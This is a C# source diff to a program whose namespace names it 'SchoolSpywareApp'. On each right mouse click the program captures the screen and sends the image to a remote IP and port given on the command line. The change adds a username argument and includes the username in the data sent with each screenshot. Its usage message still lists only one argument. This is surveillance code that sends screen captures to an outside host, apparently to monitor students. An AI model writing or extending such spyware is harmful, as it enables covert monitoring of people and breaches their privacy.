@@ -9,6 +9,7 @@ using System.Drawing.Imaging;
 using System.IO;
 using System.Net.Http;
 using System.Net.Http.Headers;
+using System.Net.NetworkInformation;
 using Newtonsoft.Json;
 
 namespace SchoolSpywareApp
@@ -19,14 +20,15 @@ namespace SchoolSpywareApp
 
         static void Main(string[] args)
         {
-            if(args.Length != 1 || !args[0].Contains(':'))
+            if(args.Length != 2 || !args[0].Contains(':'))
             {
                 string programName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
                 Console.WriteLine("Usage: {0} <ip>:<port>", programName);
                 return;
             }
             
-            var fields = args[0].Split(':');
+            string[] fields = args[0].Split(':');
+            string username = args[1];
             
             string ipAddress = fields[0];
             int port = Int32.Parse(fields[1]);
@@ -44,20 +46,21 @@ namespace SchoolSpywareApp
             {
                 if(e.Button == MouseButtons.Right)
                 {
-                    Console.WriteLine(uriBuilder.Uri);
-
                     Bitmap bitmap = ImageLib.CaptureScreen();
-
-                    SendImage(bitmap, uriBuilder.Uri);
+                    SendImage(bitmap, uriBuilder.Uri, username);
                 }
             };
 
             Application.Run();
         }
 
-        private static async void SendImage(Bitmap bitmap, Uri requestUri)
+        private static async void SendImage(Bitmap bitmap, Uri requestUri, string username)
         {
-            string json = JsonConvert.SerializeObject(new { time = DateTime.Now });
+            string json = JsonConvert.SerializeObject(new
+            {
+                time = DateTime.Now,
+                username
+            });
             StringContent jsonContent = new StringContent(json, Encoding.UTF8);
             jsonContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");
 
